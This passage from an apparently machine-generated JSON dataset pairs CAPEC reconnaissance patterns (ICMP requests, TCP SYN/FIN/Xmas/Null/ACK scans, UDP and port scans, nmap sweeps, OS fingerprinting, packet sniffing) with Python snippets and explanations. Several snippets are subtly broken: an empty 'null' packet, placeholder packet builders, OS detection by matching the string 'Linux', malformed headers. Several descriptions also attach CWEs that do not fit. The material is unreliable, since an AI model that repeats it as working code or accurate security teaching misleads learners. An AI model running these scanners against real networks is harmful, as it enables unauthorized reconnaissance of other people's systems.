        "code_snippet": "import socket\n\n# Vulnerable function to handle ICMP Address Mask Request\n\ndef handle_icmp_request():\n    # Create a raw socket to listen for ICMP packets\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    sock.bind(('0.0.0.0', 0))  # CWE-1327: Binding to an unrestricted IP address\n\n    while True:\n        packet, addr = sock.recvfrom(1024)\n        if packet[20] == 17:  # ICMP Type 17: Address Mask Request\n            print(f'Received ICMP Address Mask Request from {addr[0]}')\n            # CWE-200: Exposure of sensitive information\n            # Respond with Address Mask Reply (ICMP Type 18)\n            response = create_address_mask_reply(packet)\n            sock.sendto(response, addr)\n\n\ndef create_address_mask_reply(request_packet):\n    # Simplified response creation (not a real implementation)\n    reply = request_packet[:20] + b'\\x12' + request_packet[21:]  # Change type to 18\n    reply += b'\\xff\\xff\\xff\\x00'  # Example subnet mask (255.255.255.0)\n    return reply\n\nif __name__ == '__main__':\n    handle_icmp_request()",
        "description": "This Python code snippet demonstrates a vulnerable implementation of handling ICMP Address Mask Requests. The function `handle_icmp_request` creates a raw socket bound to the unrestricted IP address '0.0.0.0' (CWE-1327), which listens for ICMP packets. When an ICMP Type 17 (Address Mask Request) packet is received, it prints the source address and responds with an ICMP Type 18 (Address Mask Reply) packet containing a subnet mask. This exposes sensitive network configuration information (CWE-200) to any unauthorized actor sending the request. The code represents the main idea of the CAPEC by showing how an adversary can gather network information using ICMP Address Mask Requests."
    },
    {
        "capec_id": "295",
        "capec_name": "Timestamp Request",
        "code_snippet": "import requests\nimport time\n\n# Vulnerable endpoint that returns the server's current timestamp\nurl = 'http://example.com/get-timestamp'\n\n# Send a request to the server to get the current timestamp\nresponse = requests.get(url)\n\n# Extract the timestamp from the response\nserver_timestamp = response.text\n\n# Print the server's timestamp\nprint(f'Server Timestamp: {server_timestamp}')\n\n# Simulate an attack by capturing and replaying the timestamp\nreplay_url = f'http://example.com/authenticate?timestamp={server_timestamp}'\nreplay_response = requests.get(replay_url)\n\n# Print the response of the replay attack\nprint(f'Replay Attack Response: {replay_response.text}')",
        "description": "This Python code snippet demonstrates a vulnerable endpoint that exposes the server's current timestamp. An attacker can exploit this by capturing the timestamp and using it in a replay attack to bypass authentication mechanisms. The code first sends a request to the server to get the current timestamp and then uses this timestamp in a subsequent request to an authentication endpoint. This embodies the 'Timestamp Request' attack pattern (CAPEC) and highlights related weaknesses such as 'Exposure of Sensitive Information to an Unauthorized Actor' (CWE-200) and 'Authentication Bypass by Capture-replay' (CWE-294)."
    },
    {
        "capec_id": "296",
        "capec_name": "ICMP Information Request",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n\n# ICMP Information Request packet (Type 15, Code 0)\nicmp_packet = b'\\x0f\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n\n# Target IP address\ntarget_ip = '192.168.1.1'\n\n# Send the ICMP Information Request\nsock.sendto(icmp_packet, (target_ip, 0))\n\n# Receive the response\nresponse, _ = sock.recvfrom(1024)\n\n# Print the response\nprint('Received:', response)",
        "description": "This Python code snippet demonstrates how an adversary might send an ICMP Information Request (Type 15, Code 0) to a target host to check if it responds to this deprecated mechanism. The code creates a raw socket, constructs an ICMP Information Request packet, and sends it to the specified target IP address. It then waits for a response and prints it. This action can expose sensitive system information (CWE-497) if the target responds, as the ICMP Information Request is a deprecated and insecure method. The code also transmits data in cleartext (CWE-319), which can be sniffed by unauthorized actors."
    },
    {
        "capec_id": "297",
        "capec_name": "TCP ACK Ping",
        "code_snippet": "import socket\n\n# Function to send a TCP ACK ping\ndef tcp_ack_ping(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n        # Construct a TCP packet with ACK flag set\n        packet = b'\\x45\\x00\\x00\\x28\\xab\\xcd\\x00\\x00\\x40\\x06\\x00\\x00'  # IP header\n        packet += b'\\x7f\\x00\\x00\\x01'  # Source IP (127.0.0.1)\n        packet += socket.inet_aton(target_ip)  # Destination IP\n        packet += b'\\x00\\x50'  # Source port (80)\n        packet += target_port.to_bytes(2, 'big')  # Destination port\n        packet += b'\\x00\\x00\\x00\\x00'  # Sequence number\n        packet += b'\\x00\\x00\\x00\\x00'  # Acknowledgment number\n        packet += b'\\x50\\x10\\x00\\x00'  # Data offset, reserved, flags (ACK), window\n        packet += b'\\x00\\x00\\x00\\x00'  # Checksum, urgent pointer\n\n        # Send the packet\n        sock.sendto(packet, (target_ip, target_port))\n\n        # Receive the response\n        response = sock.recv(1024)\n        if response:\n            print(f'Received response from {target_ip}:{target_port}')\n    except Exception as e:\n        print(f'Error: {e}')\n    finally:\n        sock.close()\n\n# Example usage\nif __name__ == '__main__':\n    target_ip = '192.168.1.1'\n    target_port = 80\n    tcp_ack_ping(target_ip, target_port)\n",
        "description": "This Python code snippet demonstrates a TCP ACK ping, which is used to determine if a remote host is alive by sending a TCP segment with the ACK flag set. The code creates a raw socket and constructs a TCP packet with the ACK flag. It then sends this packet to the target IP and port, and listens for a response. If a response is received, it indicates that the host is alive. This technique can expose sensitive information (CWE-200) about the host's status. The code also highlights the potential risk of cleartext transmission (CWE-319) as the packet data is not encrypted."
    },
    {
        "capec_id": "298",
        "capec_name": "UDP Ping",
        "code_snippet": "import socket\n\n# Create a UDP socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nsock.settimeout(1)\n\n# Target IP and high port number\ntarget_ip = '192.168.1.1'\ntarget_port = 65535\n\n# Send a UDP packet to the target\ntry:\n    sock.sendto(b'', (target_ip, target_port))\n    # Wait for a response (ICMP Port Unreachable)\n    data, addr = sock.recvfrom(1024)\n    print(f'Received response from {addr}')\nexcept socket.timeout:\n    print('No response received')\nexcept Exception as e:\n    print(f'Error: {e}')\nfinally:\n    sock.close()",
        "description": "This Python code snippet demonstrates a UDP ping to determine if a remote host is alive. It sends a UDP datagram to a high port (65535) on the target IP address (192.168.1.1). If the port is unreachable, the target may respond with an ICMP Port Unreachable message, indicating the host is alive. The code uses a socket with a timeout to handle the response. This approach leverages the CAPEC concept of using UDP pings to detect live hosts and is related to CWEs such as exposure of sensitive information (CWE-200) and incorrectly specified destination in a communication channel (CWE-941). The code is vulnerable to information exposure as it can reveal the host's status to unauthorized actors."
    },
    {
        "capec_id": "299",
        "capec_name": "TCP SYN Ping",
        "code_snippet": "import socket\n\ndef tcp_syn_ping(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.settimeout(1)\n\n        # Construct TCP SYN packet\n        packet = b'\\x45\\x00\\x00\\x3c\\x1c\\x46\\x40\\x00\\x40\\x06\\xb1\\xe6'  # IP header\n        packet += b'\\x0a\\x00\\x00\\x01'  # Source IP\n        packet += socket.inet_aton(target_ip)  # Destination IP\n        packet += b'\\x00\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x50\\x02\\x20\\x00\\x72\\x10\\x00\\x00'  # TCP header\n\n        # Send the packet\n        sock.sendto(packet, (target_ip, target_port))\n\n        # Receive the response\n        response = sock.recvfrom(1024)[0]\n\n        # Check for SYN/ACK or RST response\n        if response[13] == 0x12:  # SYN/ACK\n            print(f\"Port {target_port} on {target_ip} is open.\")\n        elif response[13] == 0x14:  # RST\n            print(f\"Port {target_port} on {target_ip} is closed.\")\n        else:\n            print(f\"Unexpected response from {target_ip}:{target_port}\")\n    except socket.timeout:\n        print(f\"No response from {target_ip}:{target_port}\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n    finally:\n        sock.close()\n\n# Example usage\nif __name__ == '__main__':\n    tcp_syn_ping('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a TCP SYN Ping, which is used for host discovery by sending a TCP SYN packet to a target IP and port. The code creates a raw socket and constructs a TCP SYN packet. It sends the packet to the target and waits for a response. If a SYN/ACK packet is received, it indicates that the port is open. If a RST packet is received, it indicates that the port is closed. The code also handles socket timeouts and other exceptions. This snippet embodies the main idea of the CAPEC by using TCP SYN packets to determine the status of a port on a target host. The related CWEs provide additional context, such as the potential exposure of sensitive information (CWE-200) and the importance of secure transmission (CWE-319)."
    },
    {
        "capec_id": "300",
        "capec_name": "Port Scanning",
        "code_snippet": "import socket\n\n# Vulnerable code that exposes sensitive information and allows port scanning\n\ndef check_open_ports(ip, ports):\n    open_ports = []\n    for port in ports:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(1)\n        try:\n            s.connect((ip, port))\n            open_ports.append(port)\n        except (socket.timeout, ConnectionRefusedError):\n            pass\n        finally:\n            s.close()\n    return open_ports\n\n# Example usage\nip_address = '192.168.1.1'\nports_to_check = [21, 22, 80, 443, 8080]\nopen_ports = check_open_ports(ip_address, ports_to_check)\nprint(f'Open ports on {ip_address}: {open_ports}')\n\n# Exposing sensitive information\nif open_ports:\n    print(f'Sensitive information: Open ports on {ip_address} are {open_ports}')\n\n# Cleartext transmission of sensitive information\nwith open('open_ports.txt', 'w') as f:\n    f.write(f'Open ports on {ip_address}: {open_ports}')",
        "description": "This Python code snippet demonstrates a basic port scanning functionality, which is the main idea of the CAPEC. The function `check_open_ports` attempts to connect to a list of specified ports on a given IP address and returns a list of open ports. The code also exposes sensitive information by printing the open ports and writing them to a file in cleartext, which can be intercepted by unauthorized actors. This snippet embodies the vulnerabilities described in the related CWEs, such as exposure of sensitive information (CWE-200), cleartext transmission of sensitive information (CWE-319), and the potential for multiple binds to the same port (CWE-605)."
    },
    {
        "capec_id": "301",
        "capec_name": "TCP Connect Scan",
        "code_snippet": "import socket\n\n# Vulnerable TCP Connect Scan\n# CWE-291: Reliance on IP Address for Authentication\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-605: Multiple Binds to the Same Port\n# CWE-617: Reachable Assertion\n# CWE-353: Missing Support for Integrity Check\n\ndef tcp_connect_scan(target_ip, target_port):\n    try:\n        # Create a socket object\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        \n        # Attempt to connect to the target IP and port\n        result = sock.connect_ex((target_ip, target_port))\n        \n        if result == 0:\n            print(f\"Port {target_port} is open on {target_ip}\")\n        else:\n            print(f\"Port {target_port} is closed on {target_ip}\")\n        \n        sock.close()\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n# Example usage\n# This will scan port 80 on the target IP address\n# Note: This is for educational purposes only\nif __name__ == \"__main__\":\n    target_ip = \"192.168.1.1\"\n    target_port = 80\n    tcp_connect_scan(target_ip, target_port)\n",
        "description": "This Python code snippet demonstrates a basic TCP connect scan, which is a method used to determine if a specific port on a target system is open. The code attempts to establish a full TCP connection (three-way handshake) with the target IP and port. If the connection is successful, it reports the port as open; otherwise, it reports the port as closed. This embodies the main idea of the CAPEC 'TCP Connect Scan'. The code also touches on several related CWEs: it relies on the IP address for determining the target (CWE-291), potentially exposes sensitive information about open ports (CWE-200), and does not include integrity checks for the data transmitted (CWE-353). Additionally, it does not handle multiple binds to the same port (CWE-605) and could be vulnerable to reachable assertions (CWE-617) if extended improperly."
    },
    {
        "capec_id": "302",
        "capec_name": "TCP FIN Scan",
        "code_snippet": "import socket\n\ndef tcp_fin_scan(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n        # Construct the TCP packet with FIN flag set\n        packet = b''\n        # IP header fields (simplified)\n        packet += b'\\x45'  # Version and Header Length\n        packet += b'\\x00'  # Type of Service\n        packet += b'\\x00\\x28'  # Total Length\n        packet += b'\\xab\\xcd'  # Identification\n        packet += b'\\x40\\x00'  # Flags and Fragment Offset\n        packet += b'\\x40'  # TTL\n        packet += b'\\x06'  # Protocol (TCP)\n        packet += b'\\x00\\x00'  # Header Checksum (to be filled by kernel)\n        packet += socket.inet_aton('192.168.1.1')  # Source IP (example)\n        packet += socket.inet_aton(target_ip)  # Destination IP\n\n        # TCP header fields (simplified)\n        packet += b'\\x00\\x50'  # Source Port (example)\n        packet += target_port.to_bytes(2, 'big')  # Destination Port\n        packet += b'\\x00\\x00\\x00\\x00'  # Sequence Number\n        packet += b'\\x00\\x00\\x00\\x00'  # Acknowledgment Number\n        packet += b'\\x50'  # Data Offset\n        packet += b'\\x01'  # Flags (FIN)\n        packet += b'\\x71\\x10'  # Window Size\n        packet += b'\\x00\\x00'  # Checksum (to be filled by kernel)\n        packet += b'\\x00\\x00'  # Urgent Pointer\n\n        # Send the packet\n        sock.sendto(packet, (target_ip, 0))\n\n        # Receive the response\n        response = sock.recv(1024)\n        if b'\\x14' in response:  # RST flag in response\n            print(f'Port {target_port} is closed.')\n        else:\n            print(f'Port {target_port} is open or filtered.')\n    except Exception as e:\n        print(f'Error: {e}')\n\n# Example usage\ntcp_fin_scan('192.168.1.2', 80)",
        "description": "This Python code snippet demonstrates a TCP FIN scan, which is used to determine if a port on a target machine is closed. The code creates a raw socket and constructs a TCP packet with the FIN flag set. It sends this packet to the target IP and port, then listens for a response. If a TCP RST packet is received, it indicates that the port is closed. This scan technique leverages the behavior described in RFC 793, where out-of-state TCP segments sent to closed ports elicit a RST response. The code also touches on related CWEs by showing how sensitive information (port status) can be exposed to unauthorized actors (CWE-200), and how the lack of integrity checks (CWE-353) and improper restriction of communication channels (CWE-923) can be exploited in network protocols."
    },
    {
        "capec_id": "303",
        "capec_name": "TCP Xmas Scan",
        "code_snippet": "import socket\n\n# Function to perform TCP Xmas Scan\ndef tcp_xmas_scan(target_ip, target_port):\n    # Create a raw socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n    # Construct the TCP packet with all flags set (Xmas Tree Packet)\n    packet = b''\n    # IP Header (20 bytes)\n    packet += b'\\x45\\x00\\x00\\x28'  # Version, IHL, Type of Service | Total Length\n    packet += b'\\xab\\xcd\\x00\\x00'  # Identification | Flags, Fragment Offset\n    packet += b'\\x40\\x06\\x00\\x00'  # TTL, Protocol (TCP) | Header Checksum\n    packet += socket.inet_aton('192.168.1.1')  # Source IP (example)\n    packet += socket.inet_aton(target_ip)  # Destination IP\n    # TCP Header (20 bytes)\n    packet += b'\\x00\\x50\\x00\\x50'  # Source Port | Destination Port\n    packet += b'\\x00\\x00\\x00\\x00'  # Sequence Number\n    packet += b'\\x00\\x00\\x00\\x00'  # Acknowledgment Number\n    packet += b'\\x50\\xff\\xff\\xff'  # Data Offset, Reserved, Flags (all set)\n    packet += b'\\x00\\x00\\x00\\x00'  # Window Size | Checksum | Urgent Pointer\n\n    # Send the packet\n    sock.sendto(packet, (target_ip, target_port))\n\n    # Receive the response\n    try:\n        response = sock.recv(1024)\n        if response:\n            print(f'Received response from {target_ip}:{target_port}')\n    except socket.timeout:\n        print(f'No response from {target_ip}:{target_port}')\n\n# Example usage\nif __name__ == '__main__':\n    target_ip = '192.168.1.2'  # Target IP (example)\n    target_port = 80  # Target Port (example)\n    tcp_xmas_scan(target_ip, target_port)",
        "description": "This Python code snippet demonstrates a TCP Xmas scan, which is used to determine if ports are closed on a target machine. The scan sends TCP segments with all possible flags set in the packet header, creating illegal packets according to RFC 793. The expected behavior is that closed ports will respond with a RST packet, while open ports will not respond. The code constructs a raw TCP packet with all flags set, sends it to the target IP and port, and listens for a response. If a response is received, it indicates that the port is closed. This scan can expose sensitive information about the target's network configuration, aligning with CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor). The code also highlights the importance of proper communication channel restrictions and message integrity, as outlined in the related CWEs."
    },
    {
        "capec_id": "304",
        "capec_name": "TCP Null Scan",
        "code_snippet": "import socket\n\n# Function to perform TCP NULL scan\ndef tcp_null_scan(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.settimeout(1)\n\n        # Construct a TCP packet with no flags set (NULL scan)\n        packet = b''\n        sock.sendto(packet, (target_ip, target_port))\n\n        # Receive response\n        response = sock.recvfrom(1024)\n        if response:\n            print(f'Port {target_port} is closed (RST received)')\n        else:\n            print(f'Port {target_port} is open (no response)')\n    except socket.error as e:\n        print(f'Socket error: {e}')\n    except Exception as e:\n        print(f'Error: {e}')\n    finally:\n        sock.close()\n\n# Example usage\nif __name__ == '__main__':\n    target_ip = '192.168.1.1'\n    target_port = 80\n    tcp_null_scan(target_ip, target_port)",
        "description": "This Python code snippet demonstrates a TCP NULL scan, which is used to determine if ports on a target machine are closed. The code creates a raw socket and sends a TCP packet with no flags set to the specified target IP and port. If a response is received, it indicates that the port is closed (RST received). If no response is received, it indicates that the port is open. The code also includes error handling for socket errors and other exceptions. This scan technique leverages the behavior described in RFC 793, where closed ports respond with a RST packet to out-of-state TCP segments. The code also touches on related CWEs by demonstrating potential exposure of sensitive information (CWE-200) and the importance of handling NULL pointers and return values (CWE-476, CWE-690)."
    },
    {
        "capec_id": "305",
        "capec_name": "TCP ACK Scan",
        "code_snippet": "import socket\n\n# Function to perform TCP ACK Scan\ndef tcp_ack_scan(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n        # Construct TCP ACK packet\n        packet = b''\n        # IP Header (simplified)\n        packet += b'\\x45\\x00\\x00\\x28'  # Version, IHL, Type of Service, Total Length\n        packet += b'\\xab\\xcd\\x00\\x00'  # Identification, Flags, Fragment Offset\n        packet += b'\\x40\\x06\\x00\\x00'  # TTL, Protocol, Header Checksum\n        packet += socket.inet_aton('192.168.1.100')  # Source IP\n        packet += socket.inet_aton(target_ip)  # Destination IP\n        # TCP Header (simplified)\n        packet += b'\\x00\\x50'  # Source Port\n        packet += target_port.to_bytes(2, 'big')  # Destination Port\n        packet += b'\\x00\\x00\\x00\\x00'  # Sequence Number\n        packet += b'\\x00\\x00\\x00\\x00'  # Acknowledgment Number\n        packet += b'\\x50\\x10\\x00\\x00'  # Data Offset, Reserved, Flags (ACK), Window\n        packet += b'\\x00\\x00\\x00\\x00'  # Checksum, Urgent Pointer\n\n        # Send the packet\n        sock.sendto(packet, (target_ip, 0))\n        print(f\"Sent TCP ACK packet to {target_ip}:{target_port}\")\n\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n# Example usage\nif __name__ == '__main__':\n    tcp_ack_scan('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a basic TCP ACK scan, which is used to gather information about firewall or ACL configurations. The code creates a raw socket and constructs a simplified TCP ACK packet, which is then sent to a specified target IP and port. This type of scan helps in understanding the firewall rules in place. The code also touches on several CWEs: it uses raw sockets (potentially exposing sensitive information, CWE-200), and the packet is constructed and sent in cleartext (CWE-319). The code is a simplified example and does not handle all edge cases or security concerns."
    },
    {
        "capec_id": "306",
        "capec_name": "TCP Window Scan",
        "code_snippet": "import socket\n\ndef tcp_window_scan(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.settimeout(1)\n\n        # Send a TCP packet with ACK flag set\n        packet = create_ack_packet(target_ip, target_port)\n        sock.sendto(packet, (target_ip, target_port))\n\n        # Receive the response\n        response = sock.recvfrom(1024)[0]\n\n        # Extract the TCP window size from the response\n        window_size = extract_window_size(response)\n\n        if window_size > 0:\n            print(f\"Port {target_port} is open on {target_ip}\")\n        else:\n            print(f\"Port {target_port} is closed on {target_ip}\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n\ndef create_ack_packet(target_ip, target_port):\n    # This function should create a TCP packet with the ACK flag set\n    # For simplicity, this is a placeholder\n    return b''\n\n\ndef extract_window_size(response):\n    # This function should extract the TCP window size from the response\n    # For simplicity, this is a placeholder\n    return 0\n\n# Example usage\ntcp_window_scan('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a basic implementation of a TCP Window Scan, which is used to infer the status of a port on a target machine. The code creates a raw socket and sends a TCP packet with the ACK flag set to the target IP and port. It then receives the response and extracts the TCP window size to determine if the port is open or closed. The code is simplified and includes placeholders for packet creation and window size extraction. This scan technique can expose sensitive information about the target system, aligning with CWEs related to exposure of sensitive information and lack of integrity checks."
    },
    {
        "capec_id": "307",
        "capec_name": "TCP RPC Scan",
        "code_snippet": "import socket\n\n# Vulnerable code that scans for RPC services on a Unix/Linux host\nhost = '192.168.1.1'\nport = 111  # Common port for RPC services\n\ntry:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((host, port))\n    s.send(b'\\x00\\x00\\x00\\x00')  # Sending a null byte to check for response\n    response = s.recv(1024)\n    if response:\n        print(f'RPC service detected on {host}:{port}')\n    s.close()\nexcept Exception as e:\n    print(f'Error: {e}')",
        "description": "This Python code snippet demonstrates a basic TCP scan for RPC services on a Unix/Linux host. It attempts to connect to a specified host and port (commonly used for RPC services) and sends a null byte to check for a response. If a response is received, it indicates that an RPC service is running on the target host. This code embodies the main idea of the CAPEC 'TCP RPC Scan' by scanning for RPC services. The related CWEs provide additional context, such as the potential exposure of sensitive information (CWE-200) if the RPC service is not properly secured, and the risk of multiple binds to the same port (CWE-605) which could lead to service spoofing."
    },
    {
        "capec_id": "308",
        "capec_name": "UDP Scan",
        "code_snippet": "import socket\n\n# Function to perform UDP scan\ndef udp_scan(target_ip, target_port):\n    try:\n        # Create a UDP socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        sock.settimeout(1)\n\n        # Send a UDP packet to the target port\n        sock.sendto(b'', (target_ip, target_port))\n\n        try:\n            # Try to receive a response\n            data, _ = sock.recvfrom(1024)\n            print(f'Port {target_port} is open or filtered')\n        except socket.timeout:\n            print(f'Port {target_port} is open or filtered (no response)')\n        except Exception as e:\n            print(f'Error: {e}')\n    except Exception as e:\n        print(f'Error creating socket: {e}')\n    finally:\n        sock.close()\n\n# Example usage\nudp_scan('192.168.1.1', 53)",
        "description": "This Python code snippet demonstrates a basic UDP scan to determine the status of a UDP port on a target system. The function `udp_scan` creates a UDP socket and sends an empty UDP datagram to the specified target IP and port. It then waits for a response to determine if the port is open or filtered. If no response is received within the timeout period, it assumes the port is open or filtered. This code embodies the main idea of the CAPEC 'UDP Scan' by attempting to gather information about the status of a UDP port. The related CWEs are represented in the context of potential vulnerabilities: the code does not handle sensitive information securely (CWE-200, CWE-319), does not verify data integrity (CWE-353), and could be used to infer information through timing (CWE-385)."
    },
    {
        "capec_id": "309",
        "capec_name": "Network Topology Mapping",
        "code_snippet": "import os\nimport subprocess\n\n# Function to perform network topology mapping\n# This function uses ICMP tools and network mappers to scan the network\n# WARNING: This code is for educational purposes only and should not be used maliciously\n\ndef network_topology_mapping():\n    # Using ping to check if a host is up (ICMP tool)\n    hosts = ['192.168.1.1', '192.168.1.2', '192.168.1.3']\n    for host in hosts:\n        response = os.system(f'ping -c 1 {host}')\n        if response == 0:\n            print(f'{host} is up')\n        else:\n            print(f'{host} is down')\n\n    # Using nmap to scan for open ports (network mapper)\n    nmap_command = 'nmap -sP 192.168.1.0/24'\n    subprocess.run(nmap_command, shell=True)\n\n    # Using traceroute to map network routes\n    traceroute_command = 'traceroute 8.8.8.8'\n    subprocess.run(traceroute_command, shell=True)\n\n# Call the function to perform network topology mapping\nnetwork_topology_mapping()",
        "description": "This Python code snippet demonstrates a basic implementation of network topology mapping, which is a form of network reconnaissance. The code uses ICMP tools (ping) to check if specific hosts are up, a network mapper (nmap) to scan for open ports, and a route testing utility (traceroute) to map network routes. This activity aligns with the CAPEC description of Network Topology Mapping. The code also indirectly highlights several related CWEs: it exposes sensitive system information (CWE-497) by revealing which hosts are up and their open ports, and it could lead to an excessive attack surface (CWE-1125) by providing detailed network information. This code is intended for educational purposes only and should not be used for malicious activities."
    },
    {
        "capec_id": "310",
        "capec_name": "Scanning for Vulnerable Software",
        "code_snippet": "import socket\n\n# Function to scan for open ports\ndef scan_ports(ip, ports):\n    open_ports = []\n    for port in ports:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        result = sock.connect_ex((ip, port))\n        if result == 0:\n            open_ports.append(port)\n        sock.close()\n    return open_ports\n\n# Function to check for vulnerable services\ndef check_vulnerable_services(ip, open_ports):\n    vulnerable_services = {}\n    for port in open_ports:\n        if port == 21:  # FTP\n            vulnerable_services[port] = 'FTP'\n        elif port == 23:  # Telnet\n            vulnerable_services[port] = 'Telnet'\n        elif port == 25:  # SMTP\n            vulnerable_services[port] = 'SMTP'\n        elif port == 161:  # SNMP\n            vulnerable_services[port] = 'SNMP'\n    return vulnerable_services\n\n# Example usage\nip_address = '192.168.1.1'\nports_to_scan = [21, 23, 25, 80, 161]\nopen_ports = scan_ports(ip_address, ports_to_scan)\nvulnerable_services = check_vulnerable_services(ip_address, open_ports)\n\nprint(f'Open Ports: {open_ports}')\nprint(f'Vulnerable Services: {vulnerable_services}')",
        "description": "This Python code snippet demonstrates a basic port scanning and service identification process, which aligns with the CAPEC description of 'Scanning for Vulnerable Software'. The `scan_ports` function scans a given IP address for open ports from a specified list. The `check_vulnerable_services` function then checks these open ports against a list of known vulnerable services (FTP, Telnet, SMTP, SNMP). The code highlights the potential exposure of sensitive system information (CWE-497) and the risk of excessive attack surface (CWE-1125) by identifying services that could be exploited if not properly secured. This example represents the initial steps an attacker might take to find vulnerable software versions or types on a network."
    },
    {
        "capec_id": "311",
        "capec_name": "DEPRECATED: OS Fingerprinting",
        "code_snippet": "import os\nimport platform\n\n# Function to perform active OS fingerprinting\n# This is a simplified example and should not be used in production\n\ndef active_os_fingerprinting():\n    os_info = platform.uname()\n    return os_info\n\n# Function to simulate a call to a non-ubiquitous API\n# This function may not exist on all platforms\n\ndef non_ubiquitous_api_call():\n    if hasattr(os, 'non_existent_function'):\n        os.non_existent_function()\n    else:\n        print('API function does not exist on this platform')\n\n# Function to simulate improper access control to debug interface\n# This is a simplified example and should not be used in production\n\ndef access_debug_interface():\n    try:\n        with open('/sys/kernel/debug/some_debug_file', 'r') as debug_file:\n            data = debug_file.read()\n            print(data)\n    except PermissionError:\n        print('Access denied to debug interface')\n\n# Main function to demonstrate the vulnerabilities\n\ndef main():\n    print('Active OS Fingerprinting:')\n    print(active_os_fingerprinting())\n\n    print('\\nNon-ubiquitous API Call:')\n    non_ubiquitous_api_call()\n\n    print('\\nAccess Debug Interface:')\n    access_debug_interface()\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates several security vulnerabilities related to OS fingerprinting and other related weaknesses. The `active_os_fingerprinting` function uses the `platform.uname()` method to gather information about the operating system, which can be used for active OS fingerprinting (CAPEC-312). The `non_ubiquitous_api_call` function attempts to call a non-existent API function, illustrating the issue described in CWE-589. The `access_debug_interface` function tries to read from a debug file without proper access control, representing CWE-1191. These examples highlight potential security risks and should not be used in production environments."
    },
    {
        "capec_id": "312",
        "capec_name": "Active OS Fingerprinting",
        "code_snippet": "import socket\n\n# Function to send a crafted packet to a target and analyze the response\ndef os_fingerprinting(target_ip, target_port):\n    # Create a raw socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    \n    # Craft a TCP packet with unusual flags/settings\n    packet = b'\\x45\\x00\\x00\\x3c\\x1c\\x46\\x40\\x00\\x40\\x06\\xb1\\xe6'  # Example packet\n    \n    # Send the packet to the target\n    sock.sendto(packet, (target_ip, target_port))\n    \n    # Receive the response\n    response = sock.recv(1024)\n    \n    # Analyze the response to determine the OS\n    if b'Linux' in response:\n        return 'Linux'\n    elif b'Windows' in response:\n        return 'Windows'\n    else:\n        return 'Unknown'\n\n# Example usage\nif __name__ == '__main__':\n    target_ip = '192.168.1.1'\n    target_port = 80\n    os_type = os_fingerprinting(target_ip, target_port)\n    print(f'Target OS: {os_type}')",
        "description": "This Python code snippet demonstrates a basic form of active OS fingerprinting. It creates a raw socket and sends a crafted TCP packet with unusual flags/settings to a target IP address and port. The response from the target is then analyzed to determine the operating system. This process leverages the differences in how various operating systems respond to anomalous packets, which is the core idea of active OS fingerprinting. The code also touches on related CWEs by potentially exposing sensitive system information (CWE-200, CWE-497) and transmitting data in cleartext (CWE-319)."
    },
    {
        "capec_id": "313",
        "capec_name": "Passive OS Fingerprinting",
        "code_snippet": "import socket\nimport struct\n\n# Function to passively capture packets\ndef capture_packets(interface):\n    # Create a raw socket to capture packets\n    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))\n    sock.bind((interface, 0))\n    while True:\n        packet = sock.recvfrom(65565)[0]\n        # Extract IP header from the packet\n        ip_header = packet[14:34]\n        ip_hdr = struct.unpack('!BBHHHBBH4s4s', ip_header)\n        ttl = ip_hdr[5]\n        protocol = ip_hdr[6]\n        src_ip = socket.inet_ntoa(ip_hdr[8])\n        dst_ip = socket.inet_ntoa(ip_hdr[9])\n        print(f'Src IP: {src_ip}, Dst IP: {dst_ip}, TTL: {ttl}, Protocol: {protocol}')\n\n# Example usage\ncapture_packets('eth0')",
